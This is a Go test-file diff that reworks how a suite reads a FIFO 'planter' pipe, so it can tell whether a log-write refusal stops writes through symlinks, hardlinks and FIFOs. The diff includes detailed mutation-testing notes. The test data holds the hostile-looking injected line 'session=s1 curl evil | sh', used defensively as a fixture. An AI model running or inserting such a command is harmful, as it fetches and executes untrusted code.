@@ -12,7 +12,9 @@ package posse
 // Mutants (MEASURED 2026-11-21, linux): dropping syscall.O_NOFOLLOW from
 // openRefusalLeaf reds the symlink and dangling rows at every site; dropping
 // the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
-// fifo row (by the timeout below); dropping the IsRegular check reds the
+// fifo row (by leafCallWithin's timeout below, which is the only timeout in
+// this file now that the read of the planter's end has no bound to need —
+// ranger-base-b8igm); dropping the IsRegular check reds the
 // spool-read fifo row and every row of the fifth plant — and before that
 // plant existed it red the spool-read row ALONE, so the arm was live on the
 // three WRITE sites and witnessed at none of them (ranger-base-q2peg; the
@@ -26,6 +28,7 @@ package posse
 
 import (
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"syscall"
@@ -117,9 +120,14 @@ func leafPlants() []leafPlant {
 // to assert nothing was written through the plant reads it.
 //
 // A RAW descriptor and not an *os.File, because the only thing anyone does
-// with it is the bounded read below, and an *os.File has no bound for this
-// file type on every host the suite runs on (leafReachedThePlanter). A
-// planter is a process holding a descriptor, which is what this is.
+// with it is the one non-blocking read below, and an *os.File of this file
+// type does not have one: os.NewFile puts a pollable non-blocking descriptor
+// in the runtime poller, so a Read that would answer EAGAIN WAITS for
+// readiness instead — which is the hang leafPeekPlanter exists to avoid, on
+// exactly the state the assertions are about. MEASURED 2026-11-22 (linux,
+// go1.27.3) over a FIFO a writer holds open with nothing in it: the raw read
+// answers EAGAIN in 1.092µs and `os.NewFile(rd).Read` was still blocked at
+// 3s. A planter is a process holding a descriptor, which is what this is.
 func leafFifoWithAReader(t *testing.T, leaf string) int {
 	t.Helper()
 	// The plants above are called with the leaf's directory already made;
@@ -133,7 +141,7 @@ func leafFifoWithAReader(t *testing.T, leaf string) int {
 		t.Fatal(err)
 	}
 	// O_NONBLOCK so the read open does not wait for a writer, and because it
-	// is half of the bound in leafReachedThePlanter.
+	// is what makes the read in leafPeekPlanter answerable without blocking.
 	rd, err := unix.Open(leaf, unix.O_RDONLY|unix.O_NONBLOCK|unix.O_CLOEXEC, 0)
 	if err != nil {
 		t.Fatal(err)
@@ -142,81 +150,183 @@ func leafFifoWithAReader(t *testing.T, leaf string) int {
 	return rd
 }
 
-// leafReachedThePlanter is what arrived at the planter's read end, which is
-// "" when the refusal held. A bound and not a blocking read: the point of
-// the assertion is that there is nothing there, so an unbounded read would
-// hang on exactly the green case.
+// leafPipe is which of its three states a planter's pipe was in when it was
+// read. A FIFO answers a non-blocking read with exactly these and no other
+// (POSIX read(2): 0 when no process holds it for writing, EAGAIN when one
+// does and there is nothing there, n > 0 otherwise), and they are three and
+// not two because the middle one is the state this read CANNOT answer.
+type leafPipe int
+
+const (
+	leafPipeBytes  leafPipe = iota // a writer put bytes there
+	leafPipeClosed                 // no writer holds it and nothing is behind
+	leafPipeOpen                   // a writer HOLDS it and nothing is there yet
+)
+
+func (s leafPipe) String() string {
+	switch s {
+	case leafPipeBytes:
+		return "bytes"
+	case leafPipeClosed:
+		return "closed"
+	case leafPipeOpen:
+		return "held open and empty"
+	}
+	return fmt.Sprintf("leafPipe(%d)", int(s))
+}
+
+// leafPeekPlanter reads the planter's read end ONCE, without blocking, and
+// says which state it found it in.
 //
-// poll(2) over the O_NONBLOCK descriptor, and NOT an *os.File read deadline,
-// which is a runtime-POLLER fact rather than a file fact. os/file_unix.go's
-// newFile leaves a FIFO opened through OpenFile out of the netpoller on
-// darwin and ios on purpose (Go issue #24164: closing the last writer raises
-// no kqueue event there), so SetReadDeadline answers ErrNoDeadline and the
-// old bound's premise — "I can put 500ms on this read" — was a linux fact
-// written as a universal one. MEASURED: macos arm 2 at 2a50bcb5 fatalled
-// `file type does not support deadline` at 0.00s, having never read, while
-// every ubuntu arm was green (ranger-base-njj5z, run 44990274146).
-// O_NONBLOCK and poll(2) over a FIFO are POSIX and are one answer on both
-// hosts — and TestLeafReachedThePlanterSeesWhatIsInThePipe MEASURES that
-// premise on whichever host is running rather than asserting it, which is
-// what the deadline had no way to do.
+// NOT A WAIT OF ANY KIND, and that is a property of the callers rather than
+// a shortcut: every caller asks after the call under test has RETURNED, and
+// a pipe write is buffered, so whatever that call put in the pipe is already
+// there. There is nothing to wait for and nothing a bound could add — a
+// reader that sees nothing at that instant sees nothing later either,
+// because the only writer there could be has finished. What a wait DID add
+// was an answer: the bound this replaced (ranger-base-njj5z) returned ""
+// after 500ms for leafPipeOpen, which is byte-identical to its answer for
+// leafPipeClosed, so the one state it could not answer was folded into the
+// one the assertions read as "the refusal held" — and nothing on any host
+// ran that arm (ranger-base-72t07 graded all four arms of it:
+// ranger-base-b8igm).
 //
-// The read comes first on every pass: bytes already in the pipe are there
-// whatever poll says about readiness, and every caller asks after the call
-// under test has returned.
-func leafReachedThePlanter(t *testing.T, rd int) string {
-	t.Helper()
-	deadline := time.Now().Add(500 * time.Millisecond)
+// A raw unix.Read and not an *os.File read with a deadline, which was the
+// bound BEFORE that one: a deadline on a FIFO is a runtime-POLLER fact and
+// not a file fact. os/file_unix.go's newFile leaves a FIFO opened through
+// OpenFile out of the netpoller on darwin and ios on purpose (Go issue
+// #24164: closing the last writer raises no kqueue event there), so
+// SetReadDeadline answers ErrNoDeadline there — MEASURED: macos arm 2 at
+// 2a50bcb5 fatalled `file type does not support deadline` at 0.00s, having
+// never read, while every ubuntu arm was green (ranger-base-njj5z, run
+// 44990274146). O_NONBLOCK and read(2) over a FIFO are POSIX and are one
+// answer on both hosts, and
+// TestLeafReachedThePlanterReadsThePipesThreeStatesApart MEASURES all three
+// of them on whichever host is running rather than asserting them.
+//
+// The state is meaningful only when the error is nil: an errno POSIX does
+// not give a non-blocking read of a FIFO is a state this read does not know,
+// and the error is what a caller reads for it.
+func leafPeekPlanter(rd int) (string, leafPipe, error) {
 	buf := make([]byte, 4096)
-	for {
-		n, err := unix.Read(rd, buf)
-		if n > 0 {
-			return string(buf[:n])
-		}
-		if err == nil {
-			return "" // every writer closed and left nothing behind
-		}
-		if !errors.Is(err, unix.EAGAIN) && !errors.Is(err, unix.EINTR) {
-			t.Fatalf("read of the planter's end: %v", err)
-		}
-		left := time.Until(deadline).Milliseconds()
-		if left <= 0 {
-			return ""
-		}
-		fds := []unix.PollFd{{Fd: int32(rd), Events: unix.POLLIN}}
-		if _, perr := unix.Poll(fds, int(left)); perr != nil && !errors.Is(perr, unix.EINTR) {
-			t.Fatalf("poll of the planter's end: %v", perr)
-		}
+	n, err := unix.Read(rd, buf)
+	switch {
+	case n > 0:
+		return string(buf[:n]), leafPipeBytes, nil
+	case err == nil:
+		return "", leafPipeClosed, nil
+	case errors.Is(err, unix.EAGAIN):
+		return "", leafPipeOpen, nil
+	default:
+		// Not a state, and the caller fatals on the error rather than
+		// reading one: leafPipeOpen is returned because it is the answer
+		// that asserts nothing.
+		return "", leafPipeOpen, err
 	}
 }
 
-// The bound's OWN premise, measured on whatever host the suite is running
-// on. A read that cannot see bytes makes the assertion in
-// TestFoldWritesNothingIntoAPlantersPipe a tautology, and nothing in the
-// file it replaced said which hosts its premise held on — it held on linux,
-// and on macos it was a t.Fatal at the bound rather than a vacuous green,
-// which is the only reason the gap was visible at all (ranger-base-njj5z).
-// Both directions: an untouched pipe reads "" within the bound, and one a
-// writer has put bytes in reads exactly those bytes.
+// leafReachedThePlanter is what arrived at the planter's read end, which is
+// "" when the refusal held — the one reading the assertions in this file
+// take, and it exists only for the two states that have one.
 //
-// GRADED apart from the assertion it serves (MEASURED 2026-11-22, linux):
-// with the bound's `return string(buf[:n])` turned into `return ""` this pin
-// is the ONLY red in the file, and with the refusal narrowed to
-// `flag == os.O_RDONLY && !fi.Mode().IsRegular()` (ranger-base-q2peg's
-// mutant) this pin stays GREEN while TestFoldWritesNothingIntoAPlantersPipe
-// reds and reads `session=s1 curl evil | sh` back out of the pipe.
-func TestLeafReachedThePlanterSeesWhatIsInThePipe(t *testing.T) {
+// leafPipeOpen is a t.Fatalf and not "": a writer holding the pipe at the
+// instant of the read is the call under test having opened the leaf for
+// writing and not closed it, which is the refusal having FAILED, and
+// answering "" there is the vacuous green this helper was rewritten to
+// refuse. No caller can reach it — the three write sites' calls have all
+// returned by the time anyone reads, and leafCallWithin fatals on a call
+// that has not.
+//
+// SO TWO LINES HERE ARE RUN BY NOTHING, said plainly because the bound this
+// replaced said the opposite of its own unrun arms: both fatals below, and
+// leafPeekPlanter's `default` arm that feeds the first of them. MEASURED
+// 2026-11-22, linux: with `if state == leafPipeOpen` turned into `if false`
+// every test of this file still passes, and a panic planted in the `default`
+// arm is reached by none of them. That is the accounting the old timeout arm
+// could not give — and the difference that matters is the direction they
+// fail in: a fatal nothing runs can only fail to fire, while the timeout arm
+// nothing ran was an ANSWER, and the answer it gave was the one the
+// assertions read as "the refusal held". The part that could be wrong on
+// another host is the mapping from a read to a state, and all three of those
+// arms are the pin's subject below.
+//
+// EINTR is not retried, deliberately: with O_NONBLOCK the read never sleeps,
+// so it has no interruption point to be restarted from, and a retry arm
+// would be one more thing nothing runs. If it ever appears the fatal names
+// it.
+func leafReachedThePlanter(t *testing.T, rd int) string {
+	t.Helper()
+	got, state, err := leafPeekPlanter(rd)
+	if err != nil {
+		t.Fatalf("read of the planter's end: %v", err)
+	}
+	if state == leafPipeOpen {
+		t.Fatalf("the planter's pipe is %v: a writer holds it and nothing is in it, which is the one state this read cannot answer — the call under test opened the leaf for writing and left the descriptor open, so the refusal did not hold and there is no honest \"nothing arrived\" to report", state)
+	}
+	return got
+}
+
+// The helper's OWN premise, measured on whatever host the suite is running
+// on, in all three of the pipe's states. A read that cannot see bytes makes
+// the assertion in TestFoldWritesNothingIntoAPlantersPipe a tautology, and
+// nothing in the file this replaced said which hosts its premise held on —
+// it held on linux, and on macos it was a t.Fatal at the bound rather than a
+// vacuous green, which is the only reason the gap was visible at all
+// (ranger-base-njj5z).
+//
+// THE THIRD STATE IS THE POINT, and it is why this pin is three readings and
+// not two. `leafPipeOpen` is the state the old 500ms bound answered ""
+// for — the same answer it gave for "the refusal held" — so the assertion it
+// served was silent about it. This asserts the two are DISTINGUISHABLE here,
+// which is the fact leafReachedThePlanter's fatal rests on, and it is the
+// only test on this box that puts the pipe in that state at all.
+//
+// GRADED, arm by arm, apart from the assertion it serves (MEASURED
+// 2026-11-22, linux, go1.27.3, the nine tests of this file run together).
+// A panic planted at the head of each of leafPeekPlanter's three ANSWER arms
+// reds this pin and names it — bytes, closed and EAGAIN, all three, which is
+// the whole of what the helper can answer. Turning the bytes arm's `return
+// string(buf[:n])` into `return ""` leaves this pin the ONLY red in the
+// file; collapsing the EAGAIN arm to `return "", leafPipeClosed, nil`, which
+// is what the bound it replaced did after 500ms, also reds this pin alone.
+// With the refusal narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`
+// (ranger-base-q2peg's mutant) this pin stays GREEN while
+// TestFoldWritesNothingIntoAPlantersPipe reds and reads `session=s1 curl
+// evil | sh` back out of the pipe.
+func TestLeafReachedThePlanterReadsThePipesThreeStatesApart(t *testing.T) {
 	t.Parallel()
 	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
 	rd := leafFifoWithAReader(t, leaf)
+
+	// 1. No writer has ever held it: EOF, and the reading every assertion in
+	// this file takes for "the refusal held".
+	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeClosed || got != "" {
+		t.Errorf("an untouched planter's pipe read %q/%v (err %v), want \"\"/%v", got, state, err, leafPipeClosed)
+	}
 	if got := leafReachedThePlanter(t, rd); got != "" {
 		t.Errorf("an untouched planter's pipe read %q", got)
 	}
+
+	// 2. A writer holding it with nothing in it — the state the read cannot
+	// answer, and the one the old bound returned "" for after 500ms.
 	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
 	if err != nil {
 		t.Fatal(err)
 	}
+	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeOpen || got != "" {
+		t.Errorf("a planter's pipe a writer holds open and empty read %q/%v (err %v), want \"\"/%v — this state and %v are the same answer again, so a no-bytes assertion over it is vacuous", got, state, err, leafPipeOpen, leafPipeClosed)
+	}
+
+	// 3. The bytes, through the peek and then through the helper the
+	// assertions call — the second with the writer closed, which is the
+	// shape every caller reads in.
 	const sent = "session=s1 curl evil | sh\n"
+	if _, err := w.WriteString(sent); err != nil {
+		t.Fatal(err)
+	}
+	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeBytes || got != sent {
+		t.Errorf("the read did not see the planter's bytes: got %q/%v (err %v), want %q/%v", got, state, err, sent, leafPipeBytes)
+	}
 	if _, err := w.WriteString(sent); err != nil {
 		t.Fatal(err)
 	}
@@ -224,7 +334,7 @@ func TestLeafReachedThePlanterSeesWhatIsInThePipe(t *testing.T) {
 		t.Fatal(err)
 	}
 	if got := leafReachedThePlanter(t, rd); got != sent {
-		t.Errorf("the bound did not see the planter's bytes: got %q, want %q", got, sent)
+		t.Errorf("the helper did not see the planter's bytes: got %q, want %q", got, sent)
 	}
 }
 
